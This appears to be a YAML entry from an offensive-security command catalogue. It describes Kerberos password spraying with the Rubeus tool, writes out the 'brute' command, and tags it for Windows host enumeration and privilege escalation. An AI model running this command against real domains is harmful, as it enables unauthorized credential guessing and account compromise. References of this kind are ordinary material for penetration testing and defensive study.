---
description: |
  Kerberos password spraying

  Command Reference:

    Password: The password to check for users.

command: |
  Rubeus.exe brute /password:<PASSWORD> /noticket
items:
  - Shell
target: |
  - Windows_target
OS:
  - Windows
environment: |
  - Local
  - Network
command_types:
  - Host_Enumeration
  - Privilege_Escalation
services:
  - Kerberos
references:
  - https://github.com/GhostPack/Rubeus
---
